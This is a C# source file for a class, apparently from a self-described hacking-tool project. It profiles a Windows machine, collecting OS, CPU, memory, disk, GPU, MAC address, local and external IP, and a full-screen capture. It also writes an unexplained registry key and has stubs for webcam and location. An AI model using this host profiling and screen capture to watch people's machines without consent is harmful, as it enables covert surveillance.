using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Text;
using Microsoft.Win32;

namespace Default
{
    public class CSystem
    {
        public static string NOTYET = "⛔ 준비 중...";
        public static string NOTFINDNETWORK = "⛔ 찾을 수 없습니다. 네트워크 세팅을 확인해주세요.";
        public static string NOTFINDFILE = "⛔ 파일을 찾을 수 없습니다.";
        public static string DECRYPTFAIL = "⛔ 복호화를 실패 했습니다. :(";

        public string StartUp()
        {
            string str = "";
            RegistryKey reg = Registry.LocalMachine.CreateSubKey("SOFTWARE").CreateSubKey("Hi");
            str = GetStartup();


            return str;
        }

        public string GetStartup()
        {
            string str =
                "< None Hacking Tool >" + "\n\n" +
                "[ OS Info ]\t\t»\t\t" + GetOSInfo() + "\n" +
                "[ CPU Info ]\t\t»\t\t" + GetCPU() + "\n" +
                "[ Memory Info ]\t\t»\t\t" + GetMemory() + "\n" +
                "[ Storage Info ]\t\t»\t\t" + GetStorage() + "\n" +
                "[ Graphic Info ]\t\t»\t\t" + GetGraphicInfo() + "\n" +
                "[ Mac Address Info ]\t\t»\t\t" + GetMacAddress() + "\n" +
                "[ Location Info ]\t\t»\t\t" + GetLocation() + "\n" +
                "[ External IP ]\t\t»\t\t" + GetExternalIP() + "\n" +
                "[ Local IP ]\t\t»\t\t" + GetLocalIP() + "\n" +
                "[ Windows Account Info ]\t\t»\t\t" + GetWindowsAccountInfo();

            return str;
        }

        public string GetWindowsAccountInfo()
        {
            return NOTYET;
        }

        public string GetOSInfo()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem");

            foreach (ManagementObject wmi in searcher.Get())
            {
                try
                {
                    return ((string)wmi["Caption"]).Trim() + ", " + (string)wmi["Version"] + ", " + (string)wmi["OSArchitecture"];
                }
                catch (Exception)
                {
                }
            }

            return "BIOS Maker: Unknown";
        }

        public string GetCPU()
        {
            ManagementClass mc = new ManagementClass("win32_processor");
            ManagementObjectCollection moc = mc.GetInstances();
            String result = String.Empty;
            foreach (ManagementObject mo in moc)
            {
                string name = (string)mo["Name"];
                name = name.Replace("(TM)", "™").Replace("(tm)", "™").Replace("(R)", "®").Replace("(r)", "®").Replace("(C)", "©").Replace("(c)", "©").Replace("    ", " ").Replace("  ", " ");

                result = name + ", " + (string)mo["Caption"] + ", " + (string)mo["SocketDesignation"];

            }
            return result;
        }

        public string GetMemory()
        {
            ManagementScope oMs = new ManagementScope();
            ObjectQuery oQuery = new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory");
            ManagementObjectSearcher oSearcher = new ManagementObjectSearcher(oMs, oQuery);
            ManagementObjectCollection oCollection = oSearcher.Get();

            long MemSize = 0;
            long mCap = 0;

            // In case more than one Memory sticks are installed
            foreach (ManagementObject obj in oCollection)
            {
                mCap = Convert.ToInt64(obj["Capacity"]);
                MemSize += mCap;
            }
            MemSize = (MemSize / 1024) / 1024;
            return MemSize.ToString() + "MB";
        }

        public string GetStorage()
        {
            string sHDD = "";

            //현재 PC에 장착되어 있는 HDD 또는 SSD 정보를 가져온다.
            DriveInfo[] drv = DriveInfo.GetDrives();
            int y = 75;
            foreach (DriveInfo d in drv)
            {
                if (d.DriveType == DriveType.Fixed)
                {
                    string temp = "";
                    temp = d.Name + " - " + (d.TotalSize / 1024 / 1024 / 1024) + " GB";
                    sHDD = sHDD + temp + " / ";
                    y = y + 20;
                }
            }

            return sHDD;
        }

        public string GetGraphicInfo()
        {
            string result = "";

            using (ManagementObjectSearcher mos = new ManagementObjectSearcher("Select * From Win32_DisplayConfiguration"))
            {
                foreach (ManagementObject moj in mos.Get())
                {
                    result = moj["Description"].ToString();
                }
            }

            return result;
        }

        public string GetMacAddress()
        {
            string result = string.Empty;
            ObjectQuery oq = new ObjectQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled='TRUE'");
            ManagementObjectSearcher mos = new ManagementObjectSearcher(oq);
            foreach (ManagementObject mo in mos.Get())
            {
                string[] address = (string[])mo["IPAddress"];
                if (mo["MACAddress"] != null)
                {
                    result = mo["MACAddress"].ToString();
                    break;
                }
            }
            return result;
        }

        public string GetExternalIP()
        {
            string result = NOTFINDNETWORK;

            try
            {
                string checkURL = "http://checkip.dyndns.org/";

                WebClient wc = new WebClient();

                UTF8Encoding utf8 = new UTF8Encoding();

                string requestHtml = "";

                requestHtml = utf8.GetString(wc.DownloadData(checkURL));
                requestHtml = requestHtml.Substring(requestHtml.IndexOf("Current IP Address:"));
                requestHtml = requestHtml.Substring(0, requestHtml.IndexOf("</body>"));
                requestHtml = requestHtml.Split(':')[1].Trim();

                IPAddress externalIp = null;
                externalIp = IPAddress.Parse(requestHtml);

                result = externalIp.ToString();

                return result;
            }
            catch (Exception)
            {
                return result;
            }
        }

        public string GetLocalIP()
        {
            string result = NOTFINDNETWORK;

            IPHostEntry host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    result = ip.ToString();
                    break;
                }
            }

            return result;
        }

        public string GetLocation()
        {
            string result = NOTYET;

            try
            {
                return result;
            }
            catch (Exception)
            {
                return result;
            }
        }

        public Bitmap GetScreen()
        {
            int width = 0;
            int height = 0;
            var managementScope = new ManagementScope();
            managementScope.Connect();
            var q = new ObjectQuery("SELECT CurrentHorizontalResolution, CurrentVerticalResolution FROM Win32_VideoController");
            var searcher = new ManagementObjectSearcher(managementScope, q);
            var records = searcher.Get();

            foreach (var record in records)
            {
                if (!int.TryParse(record.GetPropertyValue("CurrentHorizontalResolution").ToString(), out width))
                {
                    throw new Exception("Throw some exception");
                }
                if (!int.TryParse(record.GetPropertyValue("CurrentVerticalResolution").ToString(), out height))
                {
                    throw new Exception("Throw some exception");
                }
            }

            Bitmap bmp = new Bitmap(width, height, PixelFormat.Format32bppArgb);
            Graphics gr = Graphics.FromImage(bmp);

            gr.CopyFromScreen(0, 0, 0, 0, bmp.Size); //캡쳐

            return bmp;
        }

        public Bitmap GetCam()
        {
            try
            {

            }
            catch (Exception exc)
            {

            }

            return null;
        }
    }
}
